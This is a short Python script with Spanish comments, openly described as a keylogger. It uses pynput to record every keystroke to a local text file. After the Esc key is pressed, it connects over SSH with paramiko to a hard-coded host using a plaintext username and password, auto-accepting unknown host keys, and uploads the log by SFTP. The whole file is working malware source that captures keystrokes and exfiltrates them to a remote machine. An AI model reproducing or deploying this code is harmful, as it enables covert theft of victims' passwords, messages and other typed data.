from pynput import keyboard   	#Importamos modulo keyboard == teclado
import paramiko					#Modulo para manejo de servidor SSH (En este caso Cliente)
 
ubicacion='E:\\datos.txt'		#Ubicacion de nuestro archivo(texto) el cual almacenara las entradas de nuestro teclado (Keylogger)
f=open(ubicacion,'a')			#Abrimos nuestro archivo de texto en "f" con el metodo append == "a" (Anexar texto)


def tecla_pres(key):								#Funcion o metodo tecla_pres(variable "key")
	print("Tecla presionada ==> {}".format(key))	#Imprimimos la tecla presionada
	f.write(str(format(key)))						#Escribimos la tecla presionada en nuestro archivo de texto (f)
	if(str(key)=='Key.esc'):						#Condicion ( si presionamos cualquier tecla + esc )
		print("Saliendo ...")						#Mostramos mensaje "Saliendo ..."
		f.close()									#Cerramos nuestro archivo de texto
		return False								#Finalizamos la ejecucion
		
with keyboard.Listener(tecla_pres) as listener:	#Usamos el modo (Listener == Oyente == Monitoreando teclado == llamamos ala funcion "tecla_pres")
	listener.join()								#Ejecutamos el modo Oyente
	
host='192.168.0.11'		#Host o IP del Servidor SSH
port=8022				#Puerto del Servidor SSH
username='u0_a412'		#Usuario del Servidor SSH
password='marco'		#Contraseña del Servidor SSH
	
ssh_cliente=paramiko.SSHClient()									#Definimos nuestro clienteSSH
ssh_cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())	#Aceptar automaticamete claves de host desconocidos
ssh_cliente.connect(host,port,username,password)					#Conectamos con los parametros (Host,Port,Usuario,Password)

sftp=ssh_cliente.open_sftp()		#Creamos un canal sftp
archivo_local='E:\\datos.txt'		#Nuestro archivo Local ... para enviar al servidor
archivo_remoto='/sdcard/datos.txt'	#Ubicacion en el servidor SSH

try:											#Sentencia ==> Intentar == Try == Probar
	sftp.put(archivo_local,archivo_remoto)		#Enviar nuestro archivo con los argumentos ==> (Local,Remoto)
	print("Enviado")							#Mostramos "Enviado"
except:											#Por si nuestro Try falla ...
	print("Fallo")								#Mostramos "Fallo"